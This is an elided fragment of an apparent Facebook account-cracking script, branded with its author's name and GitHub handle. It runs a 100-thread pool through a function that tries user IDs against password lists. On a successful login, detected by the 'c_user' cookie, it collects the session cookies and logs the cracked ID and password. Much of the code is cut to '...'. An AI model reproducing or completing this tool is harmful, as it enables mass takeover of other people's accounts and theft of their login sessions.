...
\033[1;96m═══════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: ASKAT MRIDHA
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mASKAT101
...
def fuck():
    ...
    with ThreadPool(max_workers=100) as turag:
        ...
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY ASKAT JOIN MY GROUP ')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               #  print(f"\x1b[38;5;196m[ASKAT-CP💔] {uid} • {ps}")
